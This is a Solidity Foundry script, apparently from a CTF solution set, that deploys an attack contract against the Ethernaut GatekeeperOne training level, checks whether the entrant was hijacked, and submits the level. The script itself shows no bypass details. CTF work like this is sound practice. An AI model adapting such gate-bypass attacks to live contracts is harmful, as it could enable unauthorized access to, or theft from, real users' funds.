// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {GatekeeperOne} from "../src/Level13.sol";
import {Attack} from "../src/Level13Attack.sol";

contract Level13Search is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        GatekeeperOne instance = GatekeeperOne(vm.envAddress("LVL13_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        address first = instance.entrant();
        console2.log("first: ", first);

        uint256 gasFound = attack.attackGatekeeperOne(instance, 0);
        console2.log("gasFound: ", gasFound);

        address second = instance.entrant();
        console2.log("second: ", second);
        if (second == me) {
            console2.log("Level13: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level13: Failed");
        }

        vm.stopBroadcast();
    }
}

contract Level13Found is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        GatekeeperOne instance = GatekeeperOne(vm.envAddress("LVL13_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        address first = instance.entrant();
        console2.log("first: ", first);

        uint256 gasFound = attack.attackGatekeeperOne(instance, 256);
        console2.log("gasFound: ", gasFound);

        address second = instance.entrant();
        console2.log("second: ", second);
        if (second == me) {
            console2.log("Level13: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level13: Failed");
        }

        vm.stopBroadcast();
    }
}
